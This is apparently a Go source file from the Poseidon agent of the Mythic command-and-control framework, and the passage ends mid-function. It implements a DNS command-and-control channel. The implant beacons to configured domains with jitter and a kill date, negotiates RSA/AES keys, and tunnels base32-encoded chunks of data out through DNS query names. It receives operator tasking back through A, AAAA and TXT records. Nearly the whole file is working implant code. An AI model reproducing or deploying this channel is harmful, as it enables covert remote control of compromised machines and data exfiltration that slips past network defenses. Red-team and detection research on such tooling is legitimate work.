//go:build (linux || darwin) && dns

package profiles

import (
	"crypto/rsa"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"math"
	"net"
	"os"
	"slices"
	"sort"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles/dnsgrpc"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/golang/protobuf/proto"
	"github.com/miekg/dns"

	"encoding/json"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// base64 encoded version of the JSON initial configuration of HTTP
var dns_initial_config string

type DNSInitialConfig struct {
	Domains                []string `json:"domains"`
	DomainRotation         string   `json:"domain_rotation"`
	DNSServer              string   `json:"dns_server"`
	FailoverThreshold      int      `json:"failover_threshold"`
	RecordType             string   `json:"record_type"`
	MaxQueryLength         int      `json:"max_query_length"`
	Killdate               string   `json:"killdate"`
	Interval               uint     `json:"callback_interval"`
	Jitter                 uint     `json:"callback_jitter"`
	EncryptedExchangeCheck bool     `json:"encrypted_exchange_check"`
	AESPSK                 string   `json:"AESPSK"`
}

type C2DNS struct {
	Domains               []string `json:"Domains"`
	DNSServer             string   `json:"DNSServer"`
	FailoverThreshold     int      `json:"failover_threshold"`
	DomainLengths         map[string]int
	DomainErrors          map[string]int
	DomainRotation        string `json:"DomainRotation"`
	CurrentDomain         int
	RecordType            string `json:"RecordType"`
	MaxQueryLength        int    `json:"max_query_length"`
	Interval              int    `json:"Interval"`
	Jitter                int    `json:"Jitter"`
	ExchangingKeys        bool
	Key                   string `json:"EncryptionKey"`
	RsaPrivateKey         *rsa.PrivateKey
	Killdate              time.Time `json:"KillDate"`
	AgentSessionID        uint32
	ShouldStop            bool
	stoppedChannel        chan bool
	interruptSleepChannel chan bool
	localInterfaces       []net.Interface
	currentLocalInterface int
	udpChunkSize          uint16
}

// DnsMessageStream tracks the progress of a message in chunk transfer
type DnsMessageStream struct {
	Size          uint32
	TotalReceived uint32
	Messages      map[uint32]*dnsgrpc.DnsPacket
	StartBytes    []uint32
}

var dnsClient = new(dns.Client)

// New creates a new HTTP C2 profile from the package's global variables and returns it
func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(dns_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial dns config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := DNSInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial dns config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2DNS{
		Domains:               initialConfig.Domains,
		DomainLengths:         make(map[string]int),
		DomainErrors:          make(map[string]int),
		DNSServer:             initialConfig.DNSServer,
		DomainRotation:        initialConfig.DomainRotation,
		FailoverThreshold:     initialConfig.FailoverThreshold,
		CurrentDomain:         0,
		Key:                   initialConfig.AESPSK,
		RecordType:            initialConfig.RecordType,
		MaxQueryLength:        initialConfig.MaxQueryLength,
		Killdate:              killDateTime,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		interruptSleepChannel: make(chan bool, 1),
		AgentSessionID:        rand.Uint32(),
		udpChunkSize:          1232,
	}
	for _, domain := range initialConfig.Domains {
		profile.DomainLengths[domain] = profile.getMaxLengthPerMessage(domain)
		profile.DomainErrors[domain] = 0
	}
	if profile.DNSServer == "" {
		profile.DNSServer = "8.8.8.8:53"
	}
	if profile.MaxQueryLength >= 255 {
		profile.MaxQueryLength = 254 // can't go past this
	}

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.Interval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.Jitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
	dnsClient.Dialer = &net.Dialer{
		Timeout: 5 * time.Second,
	}
	profile.localInterfaces, err = net.Interfaces()
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to get local interfaces, exiting: %v\n", err))
		profile.localInterfaces = []net.Interface{}
	}
	profile.currentLocalInterface = -1
	profile.adjustLocalAddress()
	RegisterAvailableC2Profile(&profile)
}
func (c *C2DNS) Sleep() {
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
	}
}
func (c *C2DNS) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							c.Sleep()
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				c.Sleep()
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}
func (c *C2DNS) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to dns\n")
	<-c.stoppedChannel
	utils.PrintDebug("dns fully stopped\n")
}
func (c *C2DNS) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "EncryptionKey":
		c.Key = value
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "Domains":
		tempDomains := strings.Split(value, ",")
		for i := range tempDomains {
			tempDomains[i] = strings.TrimSpace(tempDomains[i])
		}
		c.Domains = tempDomains
		c.DomainLengths = make(map[string]int)
		c.DomainErrors = make(map[string]int)
		for _, domain := range c.Domains {
			c.DomainErrors[domain] = 0
		}
	case "DNSServer":
		c.DNSServer = value
	case "RecordType":
		if slices.Contains([]string{"A", "AAAA", "TXT"}, value) {
			c.RecordType = value
		}
	case "DomainRotation":
		if slices.Contains([]string{"fail-over", "round-robin", "random"}, value) {
			c.DomainRotation = value
		}
	}
}
func (c *C2DNS) GetSleepInterval() int {
	return c.Interval
}
func (c *C2DNS) GetSleepJitter() int {
	return c.Jitter
}
func (c *C2DNS) GetKillDate() time.Time {
	return c.Killdate
}
func (c *C2DNS) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2DNS) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2DNS) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2DNS) ProfileName() string {
	return "dns"
}

func (c *C2DNS) IsP2P() bool {
	return false
}
func (c *C2DNS) GetPushChannel() chan structs.MythicMessage {
	return nil
}

// CheckIn a new agent
func (c *C2DNS) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			c.Sleep()
			continue
		} else {
			resp := c.SendMessage(raw)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				c.Sleep()
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				SetAllEncryptionKeys(c.Key)
				return response
			} else {
				c.Sleep()
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2DNS) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}
func (c *C2DNS) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2DNS) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2DNS) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2DNS) SendMessage(sendData []byte) []byte {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	//sendDataBase64 := base64.StdEncoding.EncodeToString(sendData)
	// bail out of trying to send data after 5 failed attempts
	for i := 0; i < 5; i++ {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
			return []byte{}
		}
		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
		today := time.Now()
		if today.After(c.Killdate) {
			utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
			os.Exit(1)
		}
		// send message
		messageID := c.streamDNSPacketToServer(sendData)
		// get message
		if messageID == 0 {
			utils.PrintDebug(fmt.Sprintf("error sending message"))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		raw := c.getDNSMessageFromServer(messageID)
		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", len(raw)))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw := c.decryptMessage(raw[36:])
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", len(enc_raw)))
				IncrementFailedConnection(c.ProfileName())
				c.Sleep()
				continue
			} else {
				if i > 0 {
					utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
				}
				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
				return enc_raw
			}
		} else {
			if i > 0 {
				utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
			}
			//fmt.Printf("response: %v\n", string(raw))
			return raw[36:]
		}

	}
	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
	return make([]byte, 0) //shouldn't get here
}
func (c *C2DNS) getRequestType() uint16 {
	switch c.RecordType {
	case "A":
		return dns.TypeA
	case "AAAA":
		return dns.TypeAAAA
	case "TXT":
		return dns.TypeTXT
	default:
		return dns.TypeAAAA
	}
}
func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
	if _, ok := c.DomainLengths[domain]; ok {
		return c.DomainLengths[domain]
	}
	// max data per message = max length - length of domain + 1 (for ".") - len of json packet
	fixedLengths := len(domain) + 1
	// need dnsPacket turned into JSON bytes - 45 bytes
	d := &dnsgrpc.DnsPacket{
		Action:         0,
		AgentSessionID: math.MaxUint32,
		MessageID:      math.MaxUint32,
		Size:           math.MaxUint32,
		Begin:          math.MaxUint32,
		Data:           nil,
	}
	jsonD, _ := proto.Marshal(d)
	//jsonD, _ := json.Marshal(d)
	fixedLengths += len(jsonD)
	//utils.PrintDebug(fmt.Sprintf("fixedLength of Packet: %d, total fixed lengths: %d", len(jsonD), fixedLengths))
	// how much data can we add to those 45 bytes after 60% expansion due to base32
	// still need to be <= 255 and need to account for one extra "." every 63 bytes
	for i := 1; i < c.MaxQueryLength; i++ {
		expandedData := int(float32(fixedLengths+i) * 1.6)
		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) base32 is (%d)", i, expandedData))
		//base32Example := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(make([]byte, fixedLengths+i))
		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) actual base32 is (%d)", i, len(base32Example)))
		expandedData += expandedData / 63
		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) needs %d . values. Total: %d", i, expandedData/63, expandedData))

		if expandedData > c.MaxQueryLength {
			c.DomainLengths[domain] = i - 1
			utils.PrintDebug(fmt.Sprintf("max message length determined for %s to be %d\n", domain, i-1))
			//os.Exit(1)
			return c.DomainLengths[domain]
		}
	}
	return 1
}
func (c *C2DNS) getDomain() string {
	domain := c.Domains[c.CurrentDomain]
	switch c.DomainRotation {
	case "round-robin":
		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.Domains)
	case "random":
		c.CurrentDomain = rand.Intn(len(c.Domains))
	case "fail-over":
		if c.DomainErrors[c.Domains[c.CurrentDomain]] > c.FailoverThreshold {
			c.CurrentDomain = (c.CurrentDomain + 1) % len(c.Domains)
			c.DomainErrors[c.Domains[c.CurrentDomain]] = 0 // reset this back in case we have to loop back
		}
	default:
		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.Domains)
	}
	return domain
}
func (c *C2DNS) increaseErrorCount(domain string) {
	c.DomainErrors[domain] += 1
	c.adjustLocalAddress()
}
func (c *C2DNS) adjustLocalAddress() {
	if len(c.localInterfaces) == 0 {
		dnsClient.Dialer.LocalAddr = nil
		return
	}
	dnsClient.Dialer.LocalAddr = nil
	return
}
func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
	sendingStream := &DnsMessageStream{
		Size:       uint32(len(msg)),
		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
		StartBytes: make([]uint32, 0),
	}
	ackStream := &DnsMessageStream{
		Size:       uint32(len(msg)),
		StartBytes: make([]uint32, 0),
	}
	messageID := rand.Uint32()
	//utils.PrintDebug(fmt.Sprintf("original message: %s\n", msg))
	for {
		domain := c.getDomain()
		dataLengthPerMessage := c.getMaxLengthPerMessage(domain)
		chunks := len(msg) / dataLengthPerMessage
		if chunks*dataLengthPerMessage < len(msg) {
			chunks += 1 // might need to add 1 if there's a portion left over
		}
		sendingStream.TotalReceived = uint32(chunks)

		//utils.PrintDebug(fmt.Sprintf("sending message: Size (%d), Chunks (%d), dataLengthPerMessage: (%d), domain: (%s)\n",
		//	sendingStream.Size, chunks, dataLengthPerMessage, domain))
		for i := 0; i < len(msg); i += dataLengthPerMessage {
			sendingStream.Messages[uint32(i)] = &dnsgrpc.DnsPacket{
				Action:         dnsgrpc.Actions_AgentToServer,
				AgentSessionID: c.AgentSessionID,
				MessageID:      messageID,
				Size:           uint32(len(msg)),
				Begin:          uint32(i),
			}
			if i+dataLengthPerMessage > len(msg) {
				sendingStream.Messages[uint32(i)].Data = msg[i:]
			} else {
				sendingStream.Messages[uint32(i)].Data = msg[i : i+dataLengthPerMessage]
			}
			sendingStream.StartBytes = append(sendingStream.StartBytes, uint32(i))
			//utils.PrintDebug(fmt.Sprintf("Begin (%d) Data: %s\n", i, sendingStream.Messages[uint32(i)].Data))
		}
		chunkErrors := 0
		for i := 0; i < chunks && chunkErrors < 10; i++ {
			m := new(dns.Msg)
			//m.RecursionAvailable = true
			m.RecursionDesired = true
			jsonData, err := proto.Marshal(sendingStream.Messages[sendingStream.StartBytes[i]])
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("marshal error: %v\n", err))
				return 0
			}
			base32Data := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData)
			finalData := ""
			for j := 0; j < len(base32Data); j += 63 {
				if j+63 >= len(base32Data) {
					finalData += base32Data[j:] + "."
				} else {
					finalData += base32Data[j:j+63] + "."
				}
			}
			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
			m = m.SetEdns0(c.udpChunkSize, true)
			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: chunk: %d, domain: %s\n", sendingStream.StartBytes[i], dns.Fqdn(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: Total domain length: %d\n", len(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
			response, _, err := dnsClient.Exchange(m, c.DNSServer)
			if errors.Is(err, dns.ErrBuf) {
				c.udpChunkSize = c.udpChunkSize + 1024
			}
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk (%d)/(%d): %v\n", i, chunks, err))
				time.Sleep(1 * time.Second)
				chunkErrors += 1
				i-- // deprecate the count and try this chunk again
				continue
			}
			if response.Truncated {
				i-- // deprecate the count and try again
				utils.PrintDebug(fmt.Sprintf("Response truncated in sending message to server\n"))
				time.Sleep(1 * time.Second)
				chunkErrors += 1
			}
			if response.Rcode != dns.RcodeSuccess {
				i-- // deprecate the count and try again
				time.Sleep(1 * time.Second)
				chunkErrors += 1
				utils.PrintDebug(fmt.Sprintf("Failed to get successful response: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
				continue
			}
			if len(response.Answer) != 1 {
				i-- // deprecate the count and try again
				time.Sleep(1 * time.Second)
				chunkErrors += 1
				utils.PrintDebug(fmt.Sprintf("failed to get an answer response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
				continue
			}
			var ackAction net.IP
			var ackMessageString string
			if c.getRequestType() == dns.TypeA {
				ackAction = response.Answer[0].(*dns.A).A
				ackMessageString = response.Answer[0].(*dns.A).Hdr.Name
			} else if c.getRequestType() == dns.TypeAAAA {
				ackAction = response.Answer[0].(*dns.AAAA).AAAA
				ackMessageString = response.Answer[0].(*dns.AAAA).Hdr.Name
			} else if c.getRequestType() == dns.TypeTXT {
				ackAction = make([]byte, net.IPv4len)
				msgAction, _ := strconv.Atoi(response.Answer[0].(*dns.TXT).Txt[0])
				if err != nil {
					i--
					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
				ackMessageString = response.Answer[0].(*dns.TXT).Hdr.Name
			} else {
				i--
				utils.PrintDebug(fmt.Sprintf("unknown request type: %v\n", c.getRequestType()))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if ackMessageString != dns.Fqdn(finalData+domain) {
				// this is a response to something we didn't send, try again
				i--
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
				// something happened and the server is asking to retransmit the message
				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[sendingStream.StartBytes[i]].MessageID))
				ackStream.StartBytes = make([]uint32, 0)
				i--
			} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ServerToAgent) {
				i = chunks // just to make sure we get out of this loop
				//utils.PrintDebug(fmt.Sprintf("Server got all message and has a response for us to fetch"))
			}
		}
		if chunkErrors < 10 {
			return messageID
		}
		c.increaseErrorCount(domain)
	}
}
func removeTrailingBytes(b []byte) []byte {
	// Start from the end of the slice
	totalToRemove := b[len(b)-1]
	return b[:len(b)-int(totalToRemove)]
}
func getActionAndBytesOrdered(responses *[]dns.RR) (action uint8, bytes []byte, err error) {
	orderedResponses := make([][]byte, len(*responses))
	finalBytes := make([]byte, 0)
	action = uint8(0)
	for _, rr := range *responses {
		switch rr.Header().Rrtype {
		case dns.TypeA:
			// first byte of the IP is the order
			data := rr.(*dns.A).A
			//utils.PrintDebug(fmt.Sprintf("data: %v\n", data))
			if int(data[0]) < len(orderedResponses) {
				orderedResponses[data[0]] = data[1:]
			} else {
				utils.PrintDebug(fmt.Sprintf("ordering byte, %d, doesn't fit in len(orderedResponses): %d\n", data[0], len(orderedResponses)))
				return action, nil, errors.New("ordering byte doesn't fit in len")
			}
			if data[0] == 0 {
				action = data[net.IPv4len-1]
			}
		case dns.TypeAAAA:
			// first byte of the IP is the order
			data := rr.(*dns.AAAA).AAAA
			//utils.PrintDebug(fmt.Sprintf("data: %v\n", data))
			if int(data[0]) < len(orderedResponses) {
				orderedResponses[data[0]] = data[1:]
			} else {
				utils.PrintDebug(fmt.Sprintf("ordering byte, %d, doesn't fit in len(orderedResponses): %d\n", data[0], len(orderedResponses)))
				return action, nil, errors.New("ordering byte doesn't fit in len")
			}
			if data[0] == 0 {
				action = data[net.IPv6len-1]
			}
		case dns.TypeTXT:
			data := rr.(*dns.TXT).Txt
			//utils.PrintDebug(fmt.Sprintf("data: %v\n", data))
			if len(data) == 1 && len(data[0]) < 4 {
				actionInt, err := strconv.Atoi(data[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert string to int: %v\n", err))
					return action, nil, err
				}
				action = uint8(actionInt)
				orderedResponses[0] = []byte{action}
			} else {
				combinedStrings := strings.Join(data, "")
				decodedData, err := base64.StdEncoding.DecodeString(combinedStrings)
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to decode base64 string: %v\n", err))
					return action, nil, err
				}
				orderedResponses[1] = decodedData
			}
		}
	}
	for i := 1; i < len(orderedResponses); i++ {
		if orderedResponses[i] == nil {
			// something went wrong, we're missing bytes in an ordered piece
			return action, []byte{}, errors.New("ordering failed, missing responses")
		}
		finalBytes = append(finalBytes, orderedResponses[i]...)
	}
	return action, finalBytes, nil
}
func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
	receivingStream := &DnsMessageStream{
		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
		StartBytes: make([]uint32, 0),
	}

	lastChunk := uint32(0)

	for {
		request := &dnsgrpc.DnsPacket{
			Action:         dnsgrpc.Actions_ServerToAgent,
			AgentSessionID: c.AgentSessionID,
			MessageID:      messageID,
			Begin:          lastChunk,
		}
		for {
			domain := c.getDomain()
			utils.PrintDebug(fmt.Sprintf("getting message (%d) from server via domain (%s)", messageID, domain))
			m := new(dns.Msg)
			//m.RecursionAvailable = true
			m.RecursionDesired = true
			jsonData, err := proto.Marshal(request)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("json marshal error: %v\n", err))
				return nil
			}
			base32Data := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData)
			finalData := ""
			for j := 0; j < len(base32Data); j += 63 {
				if j+63 >= len(base32Data) {
					finalData += base32Data[j:] + "."
				} else {
					finalData += base32Data[j:j+63] + "."
				}
			}
			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
			m = m.SetEdns0(c.udpChunkSize, true)
			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
			response, _, err := dnsClient.Exchange(m, c.DNSServer)
			if err != nil && err.Error() == "dns: overflowing header size" {
				c.udpChunkSize = c.udpChunkSize + 1024
				if c.udpChunkSize < 1024 {
					c.udpChunkSize = 4096
				}
				utils.PrintDebug(fmt.Sprintf("updating udp chunk size to %d\n", c.udpChunkSize))
			}
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk in getDNSMessageFromServer (%d): %v\n", lastChunk, err))
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				continue
			}
			if response.Truncated {
				utils.PrintDebug(fmt.Sprintf("Response truncated\n"))
				c.udpChunkSize = c.udpChunkSize + 1024
				if c.udpChunkSize < 1024 {
					c.udpChunkSize = 4096
				}
				time.Sleep(1 * time.Second)
				//c.increaseErrorCount(domain)
				continue
			}
			if response.Rcode != dns.RcodeSuccess {
				time.Sleep(1 * time.Second)
				utils.PrintDebug(fmt.Sprintf("Bad response code getting message from server: %d\n", response.Rcode))
				c.increaseErrorCount(domain)
				continue
			}
			if len(response.Answer) < 1 {
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				utils.PrintDebug(fmt.Sprintf("failed to get at least a response: %d, %s", len(response.Answer), dns.Fqdn(finalData+domain)))
				continue
			}
			//utils.PrintDebug(fmt.Sprintf("response from server: %v\n", response))
			action, packetBytes, err := getActionAndBytesOrdered(&response.Answer)
			if err != nil {
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				utils.PrintDebug(fmt.Sprintf("failed to get proper response: %v, %v", err, response.Answer))
				continue
			}
			if action == uint8(dnsgrpc.Actions_ReTransmit) {
				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
				receivingStream.StartBytes = make([]uint32, 0)
				continue
			} else if action == uint8(dnsgrpc.Actions_MessageLost) {
				utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
				return nil
			} else if dns.Fqdn(finalData+domain) != response.Answer[0].Header().Name {
				utils.PrintDebug(fmt.Sprintf("got a message that doesn't match what we sent: %v\n", response))
				time.Sleep(1 * time.Second)
				continue
			}
			receivedPacket := &dnsgrpc.DnsPacket{}
			if c.getRequestType() == dns.TypeTXT {
				err = proto.Unmarshal(packetBytes, receivedPacket)
			} else {
				err = proto.Unmarshal(removeTrailingBytes(packetBytes), receivedPacket)
			}
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to unmarshal received packet: %v\n%v", err, packetBytes))
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				continue
			}

			receivingStream.StartBytes = append(receivingStream.StartBytes, receivedPacket.Begin)
			receivingStream.Size += uint32(len(receivedPacket.Data))
			receivingStream.Messages[receivedPacket.Begin] = receivedPacket
			lastChunk += uint32(len(receivedPacket.Data))
			if receivingStream.Size == receivedPacket.Size {
				utils.PrintDebug(fmt.Sprintf("received message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
				totalBuffer := make([]byte, receivedPacket.Size)
				// sort all the start bytes to be in order
				sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
				// iterate over the start bytes and add the corresponding string data together
				for i := 0; i < len(receivingStream.StartBytes); i++ {
					copy(totalBuffer[receivingStream.Messages[receivingStream.StartBytes[i]].Begin:], receivingStream.Messages[receivingStream.StartBytes[i]].Data)
				}
				return totalBuffer
			}
			break
		}
	}
}

func (c *C2DNS) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
